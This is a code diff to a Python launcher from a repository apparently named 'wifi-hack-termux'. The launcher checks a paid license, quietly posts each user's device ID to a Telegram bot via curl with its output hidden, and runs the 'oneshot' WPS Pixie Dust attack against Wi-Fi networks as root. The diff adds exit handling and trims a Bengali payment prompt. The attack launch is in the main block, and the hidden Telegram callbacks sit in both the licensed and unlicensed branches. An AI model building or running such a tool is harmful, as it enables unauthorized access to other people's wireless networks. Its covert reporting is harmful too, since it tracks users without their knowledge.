@@ -3,6 +3,7 @@ from datetime import datetime
 import os
 import ssl
 import time
+import sys
 
 GITHUB_RAW_URL = "https://raw.githubusercontent.com/Armanyb1/wifi-hack-termux/main/expiry_database.txt"
 LOCAL_EXPIRY_FILE = "expiry_database.txt"
@@ -95,7 +96,12 @@ if __name__ == "__main__":
             alert_msg = f"[!] Arman Tool Launched!%0A👤 Device: Termux Android%0A🔑 Unique Code: {my_device_id}%0A⚡ Status: Active & Connected"
             os.system(f'curl -s -X POST "https://api.telegram.org/bot{BOT_TOKEN}/sendMessage" -d "chat_id={CHAT_ID}" -d "text={alert_msg}" > /dev/null 2>&1')
             
-            os.system('su -c "export PATH=$PATH:/data/data/com.termux/files/usr/bin; oneshot -i wlan0 -K"')
+            try:
+                os.system('su -c "export PATH=$PATH:/data/data/com.termux/files/usr/bin; oneshot -i wlan0 -K"')
+            except KeyboardInterrupt:
+                os.system('stty sane')
+                print("\n\n[!] Tool closed safely by user. Terminal is back to normal. Have a nice day!")
+                sys.exit(0)
         else:
             print("\n\033[1;31m" + "=" * 65 + "\033[0m")
             print("\033[1;31m           ❌ ACCESS DENIED - LICENSE REQUIRED ❌           \033[0m")
@@ -106,16 +112,10 @@ if __name__ == "__main__":
             print(" [💡 Tool Activate Korar Niyom:]")
             print("  1. Upore dewa Device ID ti copy korun ba screenshot nin.")
             print("  2. Payment korun (Bkash Personal): 01880374287")
-            print("     • 7 Din: 100 Taka")
-            print("     • 1 Mas: 330 Taka")
-            print("     • Lifetime: 700 Taka")
-            print("  3. Telegram-e jogajog korun:")
-            print("     • Username: \033[1;36m@Armanyb\033[0m")
-            print("     • Link: \033[1;36mhttps://t.me/Armanyb\033[0m" )
-            print("     Device ID o payment-er screenshot pathiye license activate kore nin.")
+            print("  3. Telegram-e jogajog korun: @Armanyb")
             print("\033[1;31m" + "=" * 65 + "\033[0m")
             
-            unauth_alert = f"[!] Alert: Tool Locked / Expired!%0A👤 Device: Termux Device%0A🔑 Unique Code: {my_device_id}%0A❌ Status: Access Denied (Expired/No License)"
+            unauth_alert = f"[!] Alert: Tool Locked / Expired!%0A👤 Device: Termux Device%0A🔑 Unique Code: {my_device_id}%0A❌ Status: Access Denied"
             os.system(f'curl -s -X POST "https://api.telegram.org/bot{BOT_TOKEN}/sendMessage" -d "chat_id={CHAT_ID}" -d "text={unauth_alert}" > /dev/null 2>&1')
             
     except KeyboardInterrupt:
